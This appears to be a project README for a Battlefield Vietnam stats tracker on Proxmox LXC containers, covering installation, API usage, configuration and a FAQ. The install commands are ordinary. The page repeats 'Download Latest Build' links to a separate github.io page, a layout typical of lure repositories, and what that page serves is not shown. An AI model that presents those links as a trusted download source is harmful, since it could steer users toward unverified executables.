# BFV Tracker Proxmox - Game Stats Tracker 2026

> Battlefield Vietnam stats tracking for Debian and Ubuntu LXC containers on Proxmox, packaged with a web dashboard, automated installation flow, and broad server monitoring tools.

[![Platform](https://img.shields.io/badge/Platform-Debian%2FUbuntu-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/sean-james37/bfv-log-parser-proxmox?style=flat-square)](https://github.com/sean-james37/bfv-log-parser-proxmox)

---

<p align="center">
  <a href="https://sean-james37.github.io/bfv-log-parser-proxmox/">
    <img src="https://img.shields.io/badge/Download-BFV%20Tracker%20Latest-brightgreen?style=for-the-badge" alt="Download BFV Tracker">
  </a>
</p>

> **[Download Latest Build - BFV Tracker Proxmox v1.0](https://sean-james37.github.io/bfv-log-parser-proxmox/)**

---

[Download Latest Build](https://sean-james37.github.io/bfv-log-parser-proxmox/)

---

## Overview

BFV Tracker Proxmox delivers a full Battlefield Vietnam statistics stack for Proxmox-based deployments running Debian or Ubuntu LXC containers. Instead of requiring a manual buildout, it ships with an installer that wires up MariaDB, FastAPI, nginx, and selectbf into one working system. Once installed, administrators can follow player activity, match information, and server status from a single web interface.

The project is aimed at Battlefield Vietnam community hosts and server admins who want structured data without wrestling with setup complexity. A polished UI with dark and light modes, a REST API for automation, and an admin area make it useful for both day-to-day oversight and deeper analysis. Its log parser includes deduplication filtering so the resulting statistics stay accurate and free from repeated entries.

---

## What It Includes

- **Modern web interface** with dark and light theme switching for easier day or night use
- **FastAPI REST API** for programmatic access to tracking records
- **MariaDB database backend** designed for dependable and scalable storage
- **Automated installer** that sets up dependencies and configures the stack
- **Live server status monitoring** to keep track of server health in real time
- **Admin panel** for user, server, and system management
- **Log parser with dedup filter** to keep statistics clean and duplicate-free
- **selectbf integration** for Battlefield Vietnam log handling

---

## Installation

Clone the repository to your Proxmox host or Debian/Ubuntu LXC container:

```bash
git clone https://github.com/sean-james37/bfv-log-parser-proxmox.git bfvtracker-proxmox
cd bfvtracker-proxmox
```

Run the automated installer script:

```bash
chmod +x install.sh
sudo ./install.sh
```

During setup, the installer asks for the MariaDB root password and configures the rest automatically. When it finishes, open the web interface at `http://your-container-ip:8000`.

---

## Usage

Open the dashboard in your browser to access the main tracking tools. Available views and actions include:

- **Server overview** - See all tracked Battlefield Vietnam servers along with their live status
- **Player statistics** - Inspect individual player records such as scores, kills, and playtime
- **Match history** - Look back through completed matches with timestamps and participant details
- **Admin panel** - Add or remove servers, manage users, and change system settings
- **API endpoints** - Use the REST API at `/api/v1/` for custom integrations

Example API call to fetch player data:

```bash
curl http://your-container-ip:8000/api/v1/players?limit=10
```

---

## Configuration

After installation, configuration files are placed in the `config/` directory. The main settings are:

- **Database connection** - Stored in `config/database.ini`
- **API authentication** - Modify `config/auth.yaml` for token settings
- **Log parser rules** - Adjust `config/parser.json` for custom dedup thresholds

The installer generates a default setup that works immediately. If you need to tune things manually, edit these files and restart the FastAPI service with `systemctl restart bfvtracker`.

---

## Requirements

- **Operating system:** Debian 11+ or Ubuntu 20.04+ LXC container
- **Runtime:** Python 3.8 or newer
- **Database:** MariaDB 10.5+
- **Web server:** nginx (installed automatically)
- **Storage:** Minimum 5 GB free space for logs and database
- **Network:** Port 8000 accessible for web interface, port 3306 for MariaDB (internal)

---

## FAQ

**How do I update to the latest version?**  
Pull the newest repository changes and run the installer again. Your existing configuration and database are kept intact.

**Can I run this on a non-Proxmox system?**  
Yes. It can run on any Debian or Ubuntu machine, although it is tuned for LXC containers.

**Where are the log files stored?**  
By default, processed logs are saved in `/var/log/bfvtracker/`. Raw Battlefield Vietnam logs live in `/var/log/selectbf/`.

**How do I add a new server to track?**  
Use the admin panel's "Add Server" form and enter the server IP address plus the query port.

**What happens if the database becomes large?**  
The dedup filter helps reduce repeated entries. For larger deployments, you may want to enable MariaDB log rotation or archive older records manually.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
